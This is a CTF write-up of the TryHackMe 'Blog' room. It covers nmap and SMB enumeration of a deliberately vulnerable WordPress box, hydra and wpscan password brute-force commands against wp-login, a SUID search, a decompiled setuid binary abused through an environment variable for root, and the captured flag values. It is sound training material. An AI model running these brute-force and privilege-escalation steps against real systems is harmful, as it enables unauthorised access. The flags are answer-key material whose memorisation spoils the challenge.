---
title: "Blog - TryHackMe"
author: Ludovic COULON
date: 2020-07-17
hero: ./images/hero.png
excerpt: "Writeup for the Blog CTF challenge"
---

[TryHackMe | Blog](https://tryhackme.com/room/blog)

Welcome to Blog room, a puzzle-style CTF. Collecting the item, solving the puzzle and escaping the nightmare is your top priority.

Can you survive until the end?If you have any question, do not hesitate to DM me on the discord channel.

![https://images.unsplash.com/photo-1486312338219-ce68d2c6f44d?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1352&q=80](https://images.unsplash.com/photo-1486312338219-ce68d2c6f44d?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1352&q=80)

Photo by [Glenn Carstens-Peters](https://unsplash.com/@glenncarstenspeters?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText) on [Unsplash](https://unsplash.com/s/photos/blog?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)

Billy Joel made a blog on his home computer and has started working on it. It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it! Billy has some
weird things going on his laptop. Can you maneuver around and get what
you need? Or will you fall down the rabbit hole...

In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file.

Credit to [Sq00ky](https://tryhackme.com/p/Sq00ky) for the root privesc idea ;)

---

### Setup

```bash
➜  TryHackMe nmap -A -vv 10.10.37.237
```

```bash
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy+6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P+AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq+Yuc1JbkF8dxMF51tiQF35g0Nqo+UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3+tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=
|   256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df8

80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-generator: WordPress 5.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog

139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BLOG<00>             Flags: <unique><active>
|   BLOG<03>             Flags: <unique><active>
|   BLOG<20>             Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 28514/tcp): CLEAN (Couldnt connect)
|   Check 2 (port 48324/tcp): CLEAN (Couldnt connect)
|   Check 3 (port 42470/udp): CLEAN (Timeout)
|   Check 4 (port 36313/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2020-07-12T19:07:26+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-07-12T19:07:26
|_  start_date: N/A
```

As you can see there is a SMB server open with the guest credentials, let's see what's inside of the server.

```bash
➜  blog smbclient -L 10.10.37.237
Enter WORKGROUP\kali password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

![https://imgur.com/BMgqkDa.png](https://imgur.com/BMgqkDa.png)

![https://imgur.com/ONKwYZa.png](https://imgur.com/ONKwYZa.png)

```bash
➜  blog steghide extract -sf Alice-White-Rabbit.jpg
Enter passphrase:
wrote extracted data to "rabbit_hole.txt".
➜  blog cat rabbit_hole.txt
You've found yourself in a rabbit hole, friend.
```

Let's see if we can enumerate some username to brute-force the administration page of WordPress

![https://imgur.com/ttyfVpD.png](https://imgur.com/ttyfVpD.png)

Nice, we have the username : bjoel, kwheel

Brute-force with hydra

```bash
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1&redirect_to:blog.thm/wp-admin/'
```

With wpscan

```bash
wpscan --url blog.thm -U kwheel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login
```

![https://imgur.com/NFazDUA.png](https://imgur.com/NFazDUA.png)

![https://imgur.com/3UG7eKi.png](https://imgur.com/3UG7eKi.png)

On the website you can see the CVE let's try it 🥺

![https://imgur.com/dl0F04t.png](https://imgur.com/dl0F04t.png)

![https://imgur.com/5T7o6Jf.png](https://imgur.com/5T7o6Jf.png)

### #1 root.txt

```bash
find / -xdev -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

![https://imgur.com/BdKvKff.png](https://imgur.com/BdKvKff.png)

With Ghidra I reverse engineering the binary 🐉

```c
int main(void) {
  char *adminEnv = getenv("admin");

  if (adminEnv == (char *)0x0) {
    puts("Not an Admin");
  } else {
    setuid(0);
    system("/bin/bash");
  }

  return 0;
}
```

Exploit

```bash
$ export admin=SOMTHINGHERE
# Execute the bin
$ /usr/sbin/checker
```

Nice ! You now have the root privilege 🤩

```bash
root@blog:/dev/shm: cat /root/root.txt
cat /root/root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```

### #2 user.txt

```bash
root@blog:/dev/shm:: find / -type f -name "user.txt" 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt

root@blog:/dev/shm: cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
```

### #3 Where was user.txt found?

```bash
/media/usb
```

### #4 What CMS was Billy using?

```bash
Wordpress
```

### #5 What version of the above CMS was being used?

![https://imgur.com/9JSk8SX.png](https://imgur.com/9JSk8SX.png)

```bash
5.0
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/kUD3W5P.png" alt="TryhackMeProfile" />
  </a>
</center>
